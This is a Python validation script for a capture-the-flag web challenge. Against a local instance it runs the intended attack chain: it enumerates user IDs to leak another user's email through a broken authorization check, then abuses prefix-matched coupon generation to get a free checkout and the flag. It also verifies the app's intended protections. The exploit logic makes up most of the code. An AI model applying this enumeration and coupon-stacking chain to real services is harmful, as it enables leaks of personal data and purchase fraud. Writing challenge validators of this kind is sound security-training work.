#!/usr/bin/env python3
"""
ThreadLine (chal-api-bola) — automated validation script.

Runs the full intended attack chain end-to-end against a live instance of
the challenge, AND verifies that the deliberately-secure parts of the app
(auth boundaries, coupon replay protection, duplicate-coupon race
protection) are actually holding up. Meant to be re-run after any code or
config change to catch regressions.

Usage:
    python3 validate.py [--base-url http://127.0.0.1:8000/api/v1]

Exit code 0 = every check passed. Non-zero = something regressed.
"""
import argparse
import random
import string
import sys
import threading
import time

import requests

PASS = "\033[92mPASS\033[0m"
FAIL = "\033[91mFAIL\033[0m"

# The challenge's known-at-seed-time victim data. The script re-derives the
# target email itself via BOLA (it does NOT trust this constant to drive the
# attack) — it's only used afterwards to assert the discovery was correct.
EXPECTED_TARGET_EMAIL = "Hack25@gmail.com"
EXPECTED_PRODUCT_NAME = "Premium Leather Jacket"
EXPECTED_PRODUCT_PRICE = 500
COUPON_VALUE = 50
COUPONS_NEEDED = EXPECTED_PRODUCT_PRICE // COUPON_VALUE  # 10

FLAG_PREFIX = "duck{"


class Check:
    """Tiny assertion helper that records pass/fail without raising, so the
    script can run every check and print a full report at the end."""

    def __init__(self):
        self.failures = []
        self.count = 0

    def step(self, title):
        print(f"\n[{self.count + 1}] {title}")

    def ok(self, label, condition, detail=""):
        self.count += 1
        status = PASS if condition else FAIL
        print(f"    {status}  {label}" + (f"  ({detail})" if detail and not condition else ""))
        if not condition:
            self.failures.append(f"{label}" + (f" — {detail}" if detail else ""))
        return condition

    def summary(self):
        print("\n" + "=" * 60)
        if not self.failures:
            print(f"ALL CHECKS PASSED ({self.count}/{self.count})")
            return 0
        print(f"{len(self.failures)}/{self.count} CHECK(S) FAILED:")
        for f in self.failures:
            print(f"  - {f}")
        return 1


def rand_suffix(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def new_session():
    s = requests.Session()
    return s


def register(base, session, username, email, password):
    return session.post(
        f"{base}/auth/register",
        json={"username": username, "email": email, "password": password},
        timeout=10,
    )


def login(base, session, email, password):
    return session.post(
        f"{base}/auth/login", json={"email": email, "password": password}, timeout=10
    )


def request_coupon(base, session, email):
    return session.post(f"{base}/coupons", json={"email": email}, timeout=10)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8000/api/v1")
    args = parser.parse_args()
    base = args.base_url.rstrip("/")

    chk = Check()

    # ------------------------------------------------------------------
    # 1. Health check
    # ------------------------------------------------------------------
    chk.step("Health check")
    try:
        r = requests.get(f"{base}/health", timeout=10)
        chk.ok("Service is up (200 + status ok)", r.status_code == 200 and r.json().get("status") == "ok",
               f"got {r.status_code} {r.text[:200]}")
    except requests.RequestException as e:
        chk.ok("Service is reachable", False, str(e))
        return chk.summary()

    # ------------------------------------------------------------------
    # 2. Register + auth boundary sanity
    # ------------------------------------------------------------------
    chk.step("Register attacker account and verify auth boundaries")
    attacker = new_session()
    attacker_email = f"attacker.{rand_suffix()}@evil.test"
    attacker_password = "AttackerPass!123"
    r = register(base, attacker, f"attacker_{rand_suffix(5)}", attacker_email, attacker_password)
    chk.ok("Registration succeeds (201)", r.status_code == 201, f"got {r.status_code} {r.text[:200]}")
    attacker_id = r.json().get("id") if r.status_code == 201 else None

    r_unauth = requests.get(f"{base}/users/1", timeout=10)
    chk.ok("Unauthenticated request to /users/<id> is rejected (401)", r_unauth.status_code == 401,
           f"got {r_unauth.status_code}")

    # ------------------------------------------------------------------
    # 3. Login
    # ------------------------------------------------------------------
    chk.step("Login as attacker")
    r = login(base, attacker, attacker_email, attacker_password)
    chk.ok("Login succeeds (200) and session cookie is set", r.status_code == 200 and "session" in attacker.cookies,
           f"got {r.status_code}")

    r_bad = login(base, new_session(), attacker_email, "wrong-password")
    chk.ok("Login with wrong password is rejected (401)", r_bad.status_code == 401, f"got {r_bad.status_code}")

    # ------------------------------------------------------------------
    # 4. BOLA — discover the target's exact email via /users/<id>
    # ------------------------------------------------------------------
    chk.step("BOLA: enumerate /users/<id> to discover the target's exact email")
    discovered_email = None
    discovered_id = None
    for uid in range(1, 6):
        r = attacker.get(f"{base}/users/{uid}", timeout=10)
        if r.status_code == 200:
            body = r.json()
            # Any profile that isn't our own is evidence of the BOLA.
            if body.get("id") != attacker_id and body.get("email", "").lower() != attacker_email.lower():
                discovered_email = body.get("email")
                discovered_id = body.get("id")
                # Keep scanning a couple more ids, but the seed data only
                # has one legitimate "victim" account, so the first
                # non-self hit is generally the one we want; stop early
                # once it matches the known seed target.
                if discovered_email == EXPECTED_TARGET_EMAIL:
                    break

    chk.ok("BOLA leaked another user's email without ownership check",
           discovered_email is not None, "no foreign profile was readable")
    chk.ok(f"Discovered email matches known seed target ({EXPECTED_TARGET_EMAIL})",
           discovered_email == EXPECTED_TARGET_EMAIL, f"got {discovered_email!r} (id={discovered_id})")

    target_email = discovered_email or EXPECTED_TARGET_EMAIL  # fall back so later steps can still run

    # ------------------------------------------------------------------
    # 5. Business logic flaw — prefix-matching coupon lookup
    #    First coupon uses the EXACT discovered email: this is the one
    #    that must be present on the cart for the flag condition to fire.
    # ------------------------------------------------------------------
    chk.step("Business logic: request a coupon for the exact discovered email")
    r = request_coupon(base, attacker, target_email)
    chk.ok("Coupon request for the exact target email succeeds (201)", r.status_code == 201,
           f"got {r.status_code} {r.text[:200]}")
    exact_coupon = r.json() if r.status_code == 201 else None
    if exact_coupon:
        chk.ok(f"Coupon discount amount is {COUPON_VALUE}", exact_coupon.get("discount_amount") == COUPON_VALUE,
               f"got {exact_coupon.get('discount_amount')}")

    # ------------------------------------------------------------------
    # 6. Protection check: duplicate coupon for the SAME exact email
    #    must be rejected. This proves the per-email uniqueness control
    #    (independent of the prefix flaw) is intact.
    # ------------------------------------------------------------------
    chk.step("Protection: duplicate coupon request for the same exact email is rejected")
    r_dup = request_coupon(base, attacker, target_email)
    chk.ok("Second request for the identical email returns 409 (already exists)",
           r_dup.status_code == 409, f"got {r_dup.status_code} {r_dup.text[:200]}")

    # ------------------------------------------------------------------
    # 7. Race-condition protection on coupon generation.
    #    IMPORTANT: this uses its own dedicated variant email
    #    (prefix-matched, never used elsewhere in this script) so the
    #    result isn't contaminated by the exact-email coupon already
    #    created in step 5. Two requests fire concurrently for the exact
    #    same variant email; exactly one must win (201) and the other
    #    must be rejected (409) — never both succeeding.
    # ------------------------------------------------------------------
    chk.step("Race condition: concurrent duplicate coupon requests for one fresh variant email")
    local_part, domain = target_email.split("@", 1)
    race_email = f"{local_part[:6]}RACE-{rand_suffix(4)}@{domain}"  # shares the 6-char prefix, unique overall
    race_results = []
    race_lock = threading.Lock()

    def fire_race_request():
        s = new_session()
        s.cookies.update(attacker.cookies)
        resp = request_coupon(base, s, race_email)
        with race_lock:
            race_results.append(resp.status_code)

    threads = [threading.Thread(target=fire_race_request) for _ in range(2)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)

    successes = race_results.count(201)
    conflicts = race_results.count(409)
    chk.ok("Exactly one concurrent request for the same variant email succeeds",
           successes == 1, f"results={race_results}")
    chk.ok("The other concurrent request is correctly rejected as a duplicate",
           conflicts == 1, f"results={race_results}")

    # ------------------------------------------------------------------
    # 8. Stack coupons to zero out the cart, then check out for the flag.
    # ------------------------------------------------------------------
    chk.step("Stack coupons, zero the cart, and check out")

    r = attacker.get(f"{base}/products", timeout=10)
    products = r.json() if r.status_code == 200 else []
    jacket = next((p for p in products if p.get("name") == EXPECTED_PRODUCT_NAME), None)
    chk.ok(f"Target product '{EXPECTED_PRODUCT_NAME}' exists", jacket is not None)
    if not jacket:
        return chk.summary()
    chk.ok(f"Target product price is {EXPECTED_PRODUCT_PRICE}", jacket.get("price") == EXPECTED_PRODUCT_PRICE,
           f"got {jacket.get('price')}")

    r = attacker.post(f"{base}/cart/items", json={"product_id": jacket["id"]}, timeout=10)
    chk.ok("Product added to cart (200)", r.status_code == 200, f"got {r.status_code} {r.text[:200]}")
    cart_id = r.json().get("cart_id") if r.status_code == 200 else None

    # Apply the exact-email coupon first (this is the one the flag check
    # cares about), then generate + apply enough prefix-matched variant
    # coupons to close the remaining balance.
    applied = 0
    if exact_coupon:
        r = attacker.post(f"{base}/cart/apply-coupon", json={"coupon_code": exact_coupon["code"]}, timeout=10)
        if r.status_code == 200:
            applied += 1

    remaining = COUPONS_NEEDED - applied
    for i in range(remaining):
        variant_email = f"{local_part[:6]}v{i}-{rand_suffix(4)}@{domain}"
        r = request_coupon(base, attacker, variant_email)
        if r.status_code != 201:
            continue
        coupon = r.json()
        r2 = attacker.post(f"{base}/cart/apply-coupon", json={"coupon_code": coupon["code"]}, timeout=10)
        if r2.status_code == 200:
            applied += 1

    chk.ok(f"Applied {COUPONS_NEEDED} coupons to the cart ({COUPON_VALUE} each = {EXPECTED_PRODUCT_PRICE})",
           applied == COUPONS_NEEDED, f"applied={applied}")

    r = attacker.get(f"{base}/products", timeout=10)  # cheap no-op keepalive, harmless if it fails
    r_final = attacker.post(f"{base}/cart/apply-coupon", json={"coupon_code": "PROBE-NONEXISTENT"}, timeout=10)
    chk.ok("Applying a bogus coupon code is rejected (404)", r_final.status_code == 404,
           f"got {r_final.status_code}")

    r_order = attacker.post(f"{base}/orders", json={"cart_id": cart_id}, timeout=10)
    chk.ok("Checkout succeeds (201)", r_order.status_code == 201, f"got {r_order.status_code} {r_order.text[:300]}")

    order_body = r_order.json() if r_order.status_code == 201 else {}
    chk.ok("final_price is 0", order_body.get("final_price") == 0, f"got {order_body.get('final_price')}")

    flag = order_body.get("flag")
    chk.ok("Flag is present in the checkout response", flag is not None)
    chk.ok(f"Flag has the expected format ({FLAG_PREFIX}...)", bool(flag) and flag.startswith(FLAG_PREFIX),
           f"got {flag!r}")

    print(f"\nFlag obtained: {flag}")

    return chk.summary()


if __name__ == "__main__":
    sys.exit(main())
